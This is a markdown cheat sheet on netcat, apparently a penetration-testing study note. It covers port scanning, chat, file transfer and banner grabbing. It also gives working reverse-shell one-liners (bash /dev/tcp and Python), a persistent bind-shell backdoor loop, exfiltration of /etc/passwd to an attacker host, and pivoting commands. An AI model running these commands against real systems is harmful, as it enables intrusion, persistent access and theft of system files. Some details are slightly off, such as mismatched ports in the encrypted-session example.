# NETCAT

Netcat (nc) is called the **Swiss Army knife of networking** because it is a simple yet powerful tool for network communication, It's commonly used for debugging, testing, and even for creating simple client-server applications

Why we use NETCAT

✅ **Lightweight** – Comes pre-installed on most Linux/macOS systems.

✅ **No Dependencies** – Unlike SCP or FTP, it doesn’t require authentication.

✅ **Versatile** – Works for file transfer, port scanning, reverse shells, and more.

✅ **Cross-Platform** – Works on Linux, macOS, and Windows.

### **Security Considerations**

- **Firewall Rules** : Ensure that firewalls allow traffic on the specified ports.
- **Encryption** : Netcat does not encrypt data by default. If you need secure communication, consider using tools like **`openssl`**or **`ssh`**.
- **Permissions** : Be cautious when using Netcat with elevated privileges, especially when opening ports or executing commands remotely.

### **Netcat Variants**

There are several versions of Netcat available, including:

- **GNU Netcat** : The original version.
- **Ncat** : Part of the Nmap project, offers more features and better security.
- **Socat** : A more advanced tool that can handle multiple protocols and connections.

## Netcate Syntax

```bash
nc [options] [hostname] [port]
```

### Common use Cases

1. **Port scanning**
    
    ```bash
    nc -zv <hostname> <start_port>-<end_port>
    ```
    
    - **`z`**: Zero-I/O mode (just scan for listening daemons, don't send any data).
    - **`v`**: Verbose output.
2. **Creating a Simple Chat Server**
    
    **server**
    
    ```bash
    nc -l <port>
    ```
    
    **client**
    
    ```bash
    nc <server_ip> <port>
    ```
    
3.  **File Transfer**
    
    **receiver**
    
    ```bash
    nc -l <port> > received_file
    ```
    
    **sender**
    
    ```bash
    nc <server_ip> <port> < file_to_send
    ```
    
4.  **Banner Grabbing**
    
    **What is banner Grabbing**
    
    ***Banner grabbing*** is a technique used to gain information about a computer system on a network and the services running on its open ports
    
    **GET HTTP Server Banner**
    
    ```bash
    echo -e "HEAD / HTTP/1.1\n\n" | nc <target-ip> 80
    ```
    
5. **Reverse Shell**
    
    **Attacker (listener)**
    
    ```bash
    nc -lvp 4444
    ```
    
    **target (victim machine executes this )**
    
    ```bash
    bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
    ```
    
    **python-based, if firewalls blocking nc**
    
    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
    ```
    
    **Persistence backdoor**
    
    ```bash
    while true; do nc -lvp 5555 -e /bin/bash; done
    ```
    
6. Data exfiltration
    
    **Exfiltrate /etc/passwd over netcate**
    
    **attacker**
    
    ```bash
    nc -lvp 444 > stolen_data.txt
    ```
    
    **vitctim** 
    
    ```bash
    cat /etc/passwd | nc <attacker-ip> 444
    ```
    
7. Port Forwarding & Pivoting 
    
    **forward traffic from port 8080 to 9090**
    
    ```bash
    mkfifo /tmp/f; nc -lvp 8080 0</tmp/f | nc 127.0.0.1 9090 1>/tmp/f
    ```
    
8. Encrypted Netcat session
    
    **Server:**
    
    ```bash
    ncat --ssl -lvp 444
    ```
    
    **client:**
    
    ```bash
    ncat --ssl <target-ip> 4444
    ```
    
9. Connect to a Tor Hidden Service 
    
    **Access .onion service  via netcat**
    
    ```bash
    torsocks nc <hidden-service.onion> 80
    ```
